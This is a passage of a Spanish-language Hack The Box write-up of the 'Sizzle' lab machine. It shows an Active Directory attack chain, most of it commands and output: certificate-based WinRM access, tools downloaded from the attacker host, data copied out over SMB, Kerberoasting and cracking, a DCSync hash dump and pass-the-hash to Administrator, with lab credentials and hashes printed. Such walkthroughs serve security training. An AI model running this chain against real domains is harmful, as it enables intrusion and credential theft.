SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
SMB         10.10.10.103    445    SIZZLE           [+] Enumerated shares
SMB         10.10.10.103    445    SIZZLE           Share           Permissions     Remark
SMB         10.10.10.103    445    SIZZLE           -----           -----------     ------
SMB         10.10.10.103    445    SIZZLE           ADMIN$                          Remote Admin
SMB         10.10.10.103    445    SIZZLE           C$                              Default share
SMB         10.10.10.103    445    SIZZLE           CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.10.103    445    SIZZLE           Department Shares READ            
SMB         10.10.10.103    445    SIZZLE           IPC$            READ            Remote IPC
SMB         10.10.10.103    445    SIZZLE           NETLOGON        READ            Logon server share 
SMB         10.10.10.103    445    SIZZLE           Operations                      
SMB         10.10.10.103    445    SIZZLE           SYSVOL          READ            Logon server share
```

Primeros, vemos que no podemos ejecutar comandos como dicho usuario (ya que no se ve el **pwned**) pero tenermos el privilegio de lectura sobre los recursos que antes no teniamos acceso. Algo curioso que debimos haber observado es el directorio `CertEnroll` el cual tiene por descripción `Active Directory Certificate Services share`; esto nos hace pensar que en vez de que la autenticación sea a partir de usuario-contraseña, se realice a través del uso de un certificado: [hurryupandwait.io](https://www.hurryupandwait.io/blog/certificate-password-less-based-authentication-in-winrm). Por lo tanto, es posible que exista un recurso dentro del servidor web que nos ayude con el certificado, así que utilizaremos la herramienta `wfuzz` y un diccionario especializado en rutas, para este caso, uno referente a IIS:

```bash
❯ cd /opt/
❯ git clone https://github.com/danielmiessler/SecLists.git
Clonando en 'SecLists'...
remote: Enumerating objects: 10408, done.
remote: Counting objects: 100% (496/496), done.
remote: Compressing objects: 100% (194/194), done.
remote: Total 10408 (delta 318), reused 472 (delta 301), pack-reused 9912
Recibiendo objetos: 100% (10408/10408), 883.34 MiB | 10.62 MiB/s, listo.
Resolviendo deltas: 100% (5502/5502), listo.
Actualizando archivos: 100% (5371/5371), listo.
❯ cd SecLists/
❯ tree | grep -i "iis"
│       ├── IIS.fuzz.txt
❯ find \-name IIS.fuzz.txt
./Discovery/Web-Content/IIS.fuzz.txt
❯ cd Discovery/Web-Content/
❯ wfuzz -c --hc=404 -w IIS.fuzz.txt http://10.10.10.103/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.103/FUZZ
Total requests: 211

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000031:   401        29 L     100 W      1293 Ch     "/certsrv/mscep_admin"                                          
000000030:   401        29 L     100 W      1293 Ch     "/certsrv/"                                                     
000000032:   401        29 L     100 W      1293 Ch     "/certsrv/mscep/mscep.dll"                                      
000000029:   403        29 L     92 W       1233 Ch     "/certenroll/"                                                  
000000021:   403        29 L     92 W       1233 Ch     "/aspnet_client/"                                               
000000094:   200        0 L      5 W        60 Ch       "# Look at the result codes in the headers - 403 likely mean the
                                                         dir exists, 404  means not. It takes an ISAPI filter for IIS to
                                                         return 404's for 403s."                                        
000000083:   403        29 L     92 W       1233 Ch     "/images/"                                                      
000000108:   400        6 L      26 W       324 Ch      "/%NETHOOD%/"                                                   
000000127:   400        6 L      26 W       324 Ch      "/~/<script>alert('XSS')</script>.asp"                          
000000129:   400        6 L      26 W       324 Ch      "/<script>alert('XSS')</script>.aspx"                           
000000128:   400        6 L      26 W       324 Ch      "/~/<script>alert('XSS')</script>.aspx"                         
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 196
Filtered Requests: 185
Requests/sec.: 0
```

Tenemos un recurso llamado `certsrv` que posiblemente nos ayude con el certificado que debemos utilizar, así que vamos a echarle un ojo:

![""](/assets/images/htb-sizzle/sizzle-certsrv.png)

Le proporcionamos las credenciales que tenemos del usuario **amanda**.

![""](/assets/images/htb-sizzle/sizzle-certsrv1.png)

Ahora le damos click en la opción ***Request a certificate***:

![""](/assets/images/htb-sizzle/sizzle-certsrv2.png)

Seleccionamos la opción ***advanced certificate request***:

![""](/assets/images/htb-sizzle/sizzle-certsrv3.png)

Ahora es necesario generar una key con la herramienta `openssl`:

```bash
❯ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
Generating a RSA private key
.............................+++++
...............+++++
writing new private key to 'amanda.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Nos copiamos el contenido del archivo `csr` y lo pegamos en la parte de ***Saved Request*** del sitio web y le damos en el botón de ***Submit***

```bash
❯ cat amanda.csr | xclip -sel clip
```

![""](/assets/images/htb-sizzle/sizzle-certsrv4.png)

![""](/assets/images/htb-sizzle/sizzle-certsrv5.png)

Le damos la opción ***Base 64 encoded*** y nos descargamos el certificado en la opción ***Download certificate***. Una vez obtenido el archivo de extensión `cer`, vamos a apoyarnos en la utilidad [**evil-winrm**](https://github.com/Hackplayers/evil-winrm) para obtener una consola interactiva:

```bash
❯ evil-winrm -u "amanda" -p "Ashare1972" -i 10.10.10.103 -k amanda.key -c amanda.cer -S

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\amanda\Documents> whoami
htb\amanda
*Evil-WinRM* PS C:\Users\amanda\Documents> 
```

Ahora, para obtener formas de escalar privilegios a nivel de directorio activo, vamos a utilizar las herramientas `bloodhound`, `neo4j` y [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe):

```bash
❯ apt-get install bloodhound neo4j -y
```

Transferimos el archivo `SharpHound.exe` a la máquina víctima:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.103 - - [08/Nov/2021 00:57:03] "GET /SharpHound.exe HTTP/1.1" 200 -
```

```bash
*Evil-WinRM* PS C:\Users\amanda\Documents> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> mkdir Blood


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/8/2021   1:57 AM                Blood


*Evil-WinRM* PS C:\Windows\Temp> cd Blood
*Evil-WinRM* PS C:\Windows\Temp\Blood> IWR http://10.10.14.23/SharpHound.exe -o SharpHound.exe
*Evil-WinRM* PS C:\Windows\Temp\Blood> dir


    Directory: C:\Windows\Temp\Blood


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/8/2021   2:01 AM         833024 SharpHound.exe


*Evil-WinRM* PS C:\Windows\Temp\Blood>
```

Ejecutamos la herramienta:

```bash
*Evil-WinRM* PS C:\Windows\Temp\Blood> .\SharpHound.exe
-----------------------------------------------
Initializing SharpHound at 2:04 AM on 11/8/2021
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 61 objects finished (+61 30.5)/s -- Using 26 MB RAM
Enumeration finished in 00:00:02.5977461
Compressing data to .\20211108020450_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 2:04 AM on 11/8/2021! Happy Graphing!

*Evil-WinRM* PS C:\Windows\Temp\Blood> dir


    Directory: C:\Windows\Temp\Blood


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/8/2021   2:04 AM           9073 20211108020450_BloodHound.zip
-a----        11/8/2021   2:04 AM          10139 MjA1NTZjODAtYTQzYS00OWY1LWFiOTAtMjFmYTQ1MmY1YTU4.bin
-a----        11/8/2021   2:01 AM         833024 SharpHound.exe


*Evil-WinRM* PS C:\Windows\Temp\Blood>
```

Ahora nos transferimos los archivos `.zip` y `.bin` a nuestra máquina de atacante mediante recursos compartidos samba:

```bash
❯ impacket-smbserver smbFolder -username k4miyo -password k4miyo123 $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.103,56244)
[*] AUTHENTICATE_MESSAGE (\k4miyo,SIZZLE)
[*] User SIZZLE\k4miyo authenticated successfully
[*] k4miyo:::aaaaaaaaaaaaaaaa:b0e15ae1fe79cd88a5bdfb76fd7c04b1:0101000000000000002e790e6fd4d70192d789eb0421d50a0000000001001000440079005000680071004600770048000300100044007900500068007100460077004800020010004500650057006e004900770078006200040010004500650057006e00490077007800620007000800002e790e6fd4d701060004000200000008003000300000000000000000000000002100000819cce66775f5a1738a3997f20c425afbf0bd974aa428c5427c9a2b8b20e7c00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003700000000000000000000000000
[*] Connecting Share(1:smbFolder)
```

```bash
*Evil-WinRM* PS C:\Windows\Temp\Blood> net use \\10.10.14.23\smbFolder /u:k4miyo k4miyo123
The command completed successfully.

*Evil-WinRM* PS C:\Windows\Temp\Blood> copy 20211108020450_BloodHound.zip \\10.10.14.23\smbFolder\BloodHound.zip
*Evil-WinRM* PS C:\Windows\Temp\Blood> copy MjA1NTZjODAtYTQzYS00OWY1LWFiOTAtMjFmYTQ1MmY1YTU4.bin \\10.10.14.23\smbFolder\BloodHound.bin
*Evil-WinRM* PS C:\Windows\Temp\Blood> 
```

Una vez los archivos en nuestra máquina de atacante, vamos a ejecutar `neo4j`:

```bash
❯ neo4j console
WARNING! You are using an unsupported Java runtime. 
* Please use Oracle(R) Java(TM) 11, OpenJDK(TM) 11 to run Neo4j.
* Please see https://neo4j.com/docs/ for Neo4j installation instructions.
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
2021-11-08 07:07:38.290+0000 INFO  Starting...
2021-11-08 07:07:40.388+0000 INFO  ======== Neo4j 4.2.1 ========
2021-11-08 07:07:41.426+0000 INFO  Performing postInitialization step for component 'security-users' with version 2 and status CURRENT
2021-11-08 07:07:41.426+0000 INFO  Updating the initial password in component 'security-users'  
2021-11-08 07:07:41.656+0000 INFO  Bolt enabled on localhost:7687.
2021-11-08 07:07:42.813+0000 INFO  Remote interface available at http://localhost:7474/
2021-11-08 07:07:42.814+0000 INFO  Started.
```

Ingresamos vía web a `http://localhost:7474/` y nos logueamos con las credenciales *neo4j : neo4j*. Si es la primera vez que lo ejecutamos, nos pedirá que cambiemos la contraseña. Ahora abrimos el `bloodhound` y nos logueamos con las mismas credenciales:

```bash
❯ bloodhound &
❯ disown
```

En las opciones de la parte derecha, selecciomos la que dice **Upload Data** y seleccionamos el archivo `.zip` que sacamos de la máquina víctima.

![""](/assets/images/htb-sizzle/sizzle-bloodhound.png)

Una vez que termine de cargar los datos, en la parte superior izquiera aparecen tres barritas, le damos click y nos vamos a la parte de **Analysis**:

![""](/assets/images/htb-sizzle/sizzle-bloodhound1.png)

De las opciones que se nos listan, vamos a probar **Find Shortest Paths to Domain Admins** para tratar de ver el posible camino para convertirnos en usuario administrador del dominio.

![""](/assets/images/htb-sizzle/sizzle-bloodhound2.png)

No vemos algo que nos pueda ayudar, así que vamos con la siguiente opción **Find Principals with DCSync Rights**:

![""](/assets/images/htb-sizzle/sizzle-bloodhound3.png)

Aqui ya vemos algo interesante, tenemos que el usuario **MRLKY** tiene el privilegios DS-Replication-Get-Changes y DS-Replication-Get-Changes-All en el dominio HTB.LOCAL. Si quieremos ver información sobre como ejecutar este tipo de ataque, le damos click secundario en las líneas que une al usuario con el dominio y luego en **HELP**.

![""](/assets/images/htb-sizzle/sizzle-bloodhound4.png)

![""](/assets/images/htb-sizzle/sizzle-bloodhound5.png)

Vemos que necesitamos convertirnos en el usuario **mrlky** para posterior convertirnos en administradores del dominio. Podriamos tratar de ver los usuarios que son kerberoasteables en la opción **List all Kerberoastable Accounts**:

![""](/assets/images/htb-sizzle/sizzle-bloodhound6.png)

Y tenemos al usuario **mrlky**; sin embargo, el puerto 88 no se encuentra visible desde afuerta, pero lo mas seguro es que internamente se encuentre, así que vamos a validar.

```bash
*Evil-WinRM* PS C:\Windows\Temp\Blood> netstat -ap tcp

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:21             sizzle:0               LISTENING
  TCP    0.0.0.0:80             sizzle:0               LISTENING
  TCP    0.0.0.0:88             sizzle:0               LISTENING
  TCP    0.0.0.0:135            sizzle:0               LISTENING
  TCP    0.0.0.0:389            sizzle:0               LISTENING
  TCP    0.0.0.0:443            sizzle:0               LISTENING
  TCP    0.0.0.0:445            sizzle:0               LISTENING
  TCP    0.0.0.0:464            sizzle:0               LISTENING
  TCP    0.0.0.0:593            sizzle:0               LISTENING
  TCP    0.0.0.0:636            sizzle:0               LISTENING
  TCP    0.0.0.0:3268           sizzle:0               LISTENING
  TCP    0.0.0.0:3269           sizzle:0               LISTENING
  TCP    0.0.0.0:5985           sizzle:0               LISTENING
  TCP    0.0.0.0:5986           sizzle:0               LISTENING
  TCP    0.0.0.0:9389           sizzle:0               LISTENING
  TCP    0.0.0.0:47001          sizzle:0               LISTENING
  TCP    0.0.0.0:49429          sizzle:0               LISTENING
  TCP    0.0.0.0:49664          sizzle:0               LISTENING
  TCP    0.0.0.0:49665          sizzle:0               LISTENING
  TCP    0.0.0.0:49666          sizzle:0               LISTENING
  TCP    0.0.0.0:49668          sizzle:0               LISTENING
  TCP    0.0.0.0:49677          sizzle:0               LISTENING
  TCP    0.0.0.0:49688          sizzle:0               LISTENING
  TCP    0.0.0.0:49689          sizzle:0               LISTENING
  TCP    0.0.0.0:49691          sizzle:0               LISTENING
  TCP    0.0.0.0:49694          sizzle:0               LISTENING
  TCP    0.0.0.0:49700          sizzle:0               LISTENING
  TCP    0.0.0.0:49712          sizzle:0               LISTENING
  TCP    10.10.10.103:53        sizzle:0               LISTENING
  TCP    10.10.10.103:139       sizzle:0               LISTENING
```

En este punto ya debemos estar pensando en la herramienta [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe); así que la descargamos y la transferimos a la máquina víctima:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.103 - - [08/Nov/2021 01:40:59] "GET /Rubeus.exe HTTP/1.1" 200 -
```

```bash
*Evil-WinRM* PS C:\Windows\Temp\Blood> IWR http://10.10.14.23/Rubeus.exe -o Rubeus.exe
*Evil-WinRM* PS C:\Windows\Temp\Blood> .\Rubeus.exe kerberoast /creduser:HTB.LOCAL\amanda /credpassword:Ashare1972

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/                                                                                          
                                                                                                                                 
  v2.0.0
                                                                
                                                                                                                                 [*] Action: Kerberoasting                                                                                                        

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : HTB.LOCAL
[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccoun
tName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' 
                                                                
[*] Total kerberoastable users : 1           
                                                                                                                                 
                                                                                                                                 
[*] SamAccountName         : mrlky                                                                                               
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL                                                                   
[*] ServicePrincipalName   : http/sizzle                                                                                         
[*] PwdLastSet             : 7/10/2018 2:08:09 PM                                                                                
[*] Supported ETypes       : RC4_HMAC_DEFAULT
*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$7EE4B1AAF9996CCD194A6D11FA3A
                             C8A3$BABA7849A96D453A5BDC25CD638FB40540FCDCF53A94FD0EE8C70496D6A60474DC13E76886F
                             A90E887FB199209F68FD8FB7C96CBF19DC6FBC5A17B44EABA48577E9027C9AB01B9876B4BFB278D7
                             CED703DDB47A70A747770F251B80989666BEA70F9284ED7F383BDA4DCCF60901784918F5D67B4802
                             5C92A9573D30BE9BA9D4B142157BC9C92955D980F0B54676AC035E5BD921026E0E1DD2BF878F69C1
                             31875B384F9EEEB8BD2A9B4596D6CC32638C6AEF58675DBC92A7D4ED45090F4D243394AD352083E7
                             239C1DFB281E01DDBBA9D0A228118A93A38A88E2662825A501FFF9FA5B48129FDCA63311C35DF724
                             7BD040D0E4617377D46F4B8194EBC198B7395052F8BD009AC9E29E99BF9BE80603CB147AA6F62380
                             4C2E1259623DB3C3A8C11BE93E93D5F046F065A62CE43F22F0CE4FE81859F8DA7D8233D8B868B8B5
                             EDAD615717AC0504F70274B009FE11505DDB7D22E11FAECE61286B090FE6A1BD8AA4CEB4C1E3A921
                             E94947FD251DFC540D0BD496045B93FB16E68E1FAC46A725B36C055B8B8A0B288593EC5494A2B63B
                             8F372F5B4A758C24672BB5DB483647BD0AA59618E148182F10F21A603729D1B74F17C40748E0EDC5
                             AE4FF9DC73204D2DEA3390705AA65336E3C3B59E76B8922738585D15A500E07F6FDD37F26DE7D874
                             163A3F6D0604519BE37238DAA88D1A71E6385AD7DCD9F744AA855EAE52359DE38FFB5F1A6DF4636F
                             E6CF3B9B00EDD94D0F78947357167A1C0EA0A23F8B995596C8A6CAFBD2BE5E51C48E8E4C9511ABEB
                             EAD742BC839DD840265A7DB9C8EA80D58F6547DD2D4FCBD3E1738576777E5A398509E1079C2493F7
                             FB6C3E515C962534E73D0F3909F743A28774B81C3FC912FEF511AE9950D4EB30AAB96B408932C431
                             739C7744CD0EEE29B08DA13E4A661E4A9EAFC4D426AE19BFD27F557B8DBF57A679BFF1B424C273F8
                             70D28C2D8CD854B7B5193BBC9FAFA38CD0FF67194D813FAEFA7F2C7E6A25BB50092030560064A669
                             5D8D46D15AF09EA62B47B1E352BE130012690C69AADED8B053927B4835A3FFCC835BC5F23930429C
                             CAFB44E5B4588BBC71709AE704EB482B9CFC8334616F17087FB7B9084D8A6F19B625138A8D984DCD
                             C0762B7A853AE0630BE61483B4448D0250EE0AE691643E5FEB7727A6615D0A4610EB29A9CBAA856B
                             B7EC43130640DE573409E99902D870C45F6B0848DC4BE57C3DD7D5C1311900B7BB960BA7F846442D
                             C82C35CAEC37E1C74A13A8A81855DCDFA2E4262097E211BD6349AFF55305AE4CCC52CCF5A744BE5A
                             CBF6F587FFD6118BED1DAC2CB2531D26BEC9FE45219BBF3CB9D5F15FBFF6489470CC48A023F67A35
                             0217797EF6AD11556

*Evil-WinRM* PS C:\Windows\Temp\Blood>
```

Ya tenemos el hash del usuario **mrlky**, ahora vamos a tratar de primeramente guardarlo en un archivo con el formato correcto.

```bash
❯ cat hash | sed 's/^ *//' | tr -d '\n' > mrlky_hash
```

Y ahora si con `john` vamos a tratar de crackear:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt mrlky_hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)
1g 0:00:00:03 DONE (2021-11-08 01:47) 0.2680g/s 2994Kp/s 2994Kc/s 2994KC/s Francisfer..Flubb3r
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya tenemos la contraseña del usuario **mrlky**. Siempre debemos de guardar las credenciales identificadas para no volver a hacer de nuevo el proceso. Ahora realizamos el mismo proceso para obtener los archivos `.key` y `.cer` como hicimos con el usuario **amanda** y tratamos de conectarnos con `evil-winrm`.

```bash
❯ evil-winrm -u "mrlky" -p "Football#7" -i 10.10.10.103 -k mrlky.key -c mrlky.cer -S

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents> whoami
htb\mrlky
*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents>
```

En este punto ya podemos visualizar la flag (user.txt). Y como vimos anteriormente, tenemos los privilegios DS-Replication-Get-Changes y DS-Replication-Get-Changes-All; por lo vamos a ahcer un ataque **DCSync**, con el cual vamos a simular el comportamiento de un controlador de dominio y solicitar a otros controladores de dominio que repliquen la información mediante el protocolo remoto del servicio de replicación de directorios (MS-DRSR). Con esto obtendríamos los hashes de los usuarios, incluyendo el del **Administrator**.

```bash
❯ impacket-secretsdump HTB.LOCAL/mrlky:Football#7@10.10.10.103
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:1eab50e0537844670480a036b770f79e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:7913c556d1745ce1d02374ea05dc4c6afd7fa23d3b17962f2f49d9e2b6cb553e
SIZZLE$:aes128-cts-hmac-sha1-96:74b3d0657c844533c1126b384a69b072
SIZZLE$:des-cbc-md5:62e0b0899d23a42c
[*] Cleaning up..
```

Ahora como ya contamos con el hash del usuario **Administrator**; podemos hacer pass the hash para ingresar al sistema.

```bash
❯ impacket-wmiexec HTB.LOCAL/Administrator@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

C:\>
```

Ya nos encontramos dentro de la máquina como el usuario **Administrator** y podemos visualizar la flag (root.txt).
